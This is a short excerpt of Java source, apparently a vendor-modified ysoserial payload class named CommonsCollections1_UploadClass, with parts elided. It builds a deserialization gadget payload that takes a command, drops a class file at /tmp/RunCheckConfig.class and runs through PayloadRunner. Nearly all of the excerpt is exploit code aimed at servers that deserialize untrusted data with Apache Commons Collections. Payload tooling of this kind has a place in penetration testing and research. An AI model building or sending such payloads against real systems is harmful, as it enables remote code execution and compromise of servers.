...
// AHNLAB-Modified 1 : UPLOAD RunCheckConfig.class
public class CommonsCollections1_UploadClass extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		String TempFilePath = "/tmp/RunCheckConfig.class";
	...
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1_UploadClass.class, args);
	}
